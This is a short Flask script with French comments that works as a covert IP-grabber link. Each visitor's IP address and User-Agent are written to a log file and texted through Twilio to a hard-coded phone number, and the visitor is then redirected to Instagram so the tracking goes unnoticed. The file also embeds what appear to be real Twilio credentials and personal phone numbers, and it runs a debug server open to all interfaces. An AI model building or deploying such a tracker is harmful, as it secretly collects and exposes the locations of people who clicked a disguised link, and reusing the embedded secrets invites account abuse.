from flask import Flask, request, redirect
from twilio.rest import Client
import datetime

app = Flask(__name__)

# === CONFIG TWILIO ===
# Remplace les valeurs ci-dessous par celles de ton compte Twilio
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'  # Ton SID Twilio (commence par AC...)
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'      # Ton Auth Token
from_number = '+12524866318'                         # Ton numéro Twilio
to_number = '+33635960569'                           # Ton numéro de téléphone (destinataire SMS)

client = Client(account_sid, auth_token)

# === Fonction pour envoyer un SMS ===
def send_sms(ip_address, user_agent):
    body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
    try:
        message = client.messages.create(
            body=body,
            from_=from_number,
            to=to_number
        )
        print(f"[✔] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[✖] Erreur d'envoi SMS : {e}")

# === Fonction pour écrire dans le fichier log.txt ===
def log_to_file(ip_address, user_agent):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as file:
        file.write(f"[{now}] IP: {ip_address} | User-Agent: {user_agent}\n")

# === Route principale ===
@app.route('/')
def index():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    print(f"[→] Visiteur détecté - IP: {ip_address}, UA: {user_agent}")

    # Log dans un fichier
    log_to_file(ip_address, user_agent)

    # Envoie par SMS
    send_sms(ip_address, user_agent)

    # Redirection après le tracking
    return redirect("https://www.instagram.com")

# === Lancement de l'app ===
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
